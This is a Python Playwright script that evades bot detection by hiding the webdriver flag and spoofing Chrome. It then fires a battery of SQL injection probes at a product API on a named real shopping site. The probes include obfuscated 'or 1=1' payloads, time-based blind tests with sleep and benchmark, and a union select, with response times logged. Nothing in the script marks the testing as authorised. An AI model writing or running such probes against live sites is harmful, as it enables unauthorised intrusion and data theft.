from playwright.sync_api import sync_playwright
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto("https://m.lbtek.com/points-mall", wait_until="domcontentloaded", timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async () => {
      const out={};
      const get=async(n,u)=>{try{const t0=performance.now();const r=await fetch(u,{headers:{'lang':'zh-CN'}});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>120?t.slice(0,120):t);}catch(e){out[n]='ERR '+String(e).slice(0,50);}};
      const P='/api/v1/product/leadtime/';
      await get('base','/api/v1/product/leadtime/9376?num=1');
      await get('hash','/api/v1/product/leadtime/9376%23?num=1');
      await get('sq_hash','/api/v1/product/leadtime/9376%27%23?num=1');
      await get('hex','/api/v1/product/leadtime/0x39333736?num=1');
      await get('plus','/api/v1/product/leadtime/9376+0?num=1');
      await get('or_tab','/api/v1/product/leadtime/0%09or%091=1%23?num=1');
      await get('or_cmt','/api/v1/product/leadtime/0/**/or/**/1=1%23?num=1');
      await get('or_pipe','/api/v1/product/leadtime/0%7c%7c1=1%23?num=1');
      await get('and_tab','/api/v1/product/leadtime/9376%09and%091=2%23?num=1');
      await get('sleep_tab','/api/v1/product/leadtime/0%09or%09sleep(3)%23?num=1');
      await get('sleep_cmt','/api/v1/product/leadtime/0/**/or/**/sleep(3)%23?num=1');
      await get('bench','/api/v1/product/leadtime/0%09or%09benchmark(3000000,md5(1))%23?num=1');
      await get('union_cmt','/api/v1/product/leadtime/0/**/union/**/select/**/1,2,3%23?num=1');
      return out;
    }""")
    print('===== SQLI2 =====',flush=True)
    for k,v in res.items(): print('%-12s %s'%(k,v),flush=True)
    b.close()
